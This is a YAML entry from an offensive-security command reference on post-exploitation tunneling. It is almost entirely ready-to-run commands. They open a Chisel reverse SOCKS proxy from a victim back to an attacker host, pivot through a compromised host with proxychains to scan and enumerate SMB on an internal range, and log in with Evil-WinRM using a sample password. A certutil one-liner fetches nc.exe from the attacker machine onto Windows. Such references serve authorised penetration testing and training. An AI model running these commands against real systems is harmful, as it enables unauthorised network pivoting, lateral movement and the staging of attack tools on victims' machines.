---
description: |
  Common port forwarding and tunneling scenarios for accessing internal services, proxying traffic through compromised hosts, and transferring files in restricted environments.
command: |
  # Scenario 1 — Forward internal web service to attack box:
  # Discover internal services
  netstat -antp
  # Forward internal HTTP to local port 8080
  ssh -L 8080:127.0.0.1:80 sec_user@10.10.10.27
  # Access via: http://localhost:8080
  # Forward internal HTTPS service
  ssh -L 8443:127.0.0.1:8443 sec_user@10.10.10.27
  # Access via: https://localhost:8443

  # Scenario 2 — SSH SOCKS proxy for Burp Suite:
  # Create SOCKS proxy on port 9090
  ssh -D 9090 sec_user@10.10.10.27
  # Configure Burp: Settings > Network > Connections > SOCKS Proxy
  # Host: 127.0.0.1  Port: 9090
  # Traffic now appears to originate from 10.10.10.27

  # Scenario 3 — Chisel reverse SOCKS proxy:
  # Attacker — start Chisel server
  chisel server -p 8000 --reverse
  # Victim — connect back to attacker
  chisel client 10.10.10.21:8000 R:socks
  # SOCKS proxy runs on attacker at 127.0.0.1:1080
  # Edit /etc/proxychains4.conf:
  # socks5 127.0.0.1 1080

  # Scenario 4 — Access internal network through compromised host:
  # Scan internal hosts through proxy
  proxychains nmap -sT -Pn 172.16.0.0/24
  # Enumerate SMB on internal range
  proxychains nxc smb 172.16.0.0/24
  # Connect to internal host via Evil-WinRM
  proxychains evil-winrm -i 172.16.0.10 -u sec_user -p 'P@ssw0rd'

  # Scenario 5 — Windows file download with certutil (cmd only):
  certutil -urlcache -f http://10.10.10.21:8000/nc.exe C:\Users\Public\nc.exe

  # Scenario 6 — Reverse SSH tunnel:
  # From local machine — open reverse tunnel to remote
  ssh -R 9000:localhost:22 sec_user@10.10.10.27
  # From remote — connect back through the tunnel
  ssh -p 9000 user@localhost
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
  - https://github.com/jpillora/chisel
---
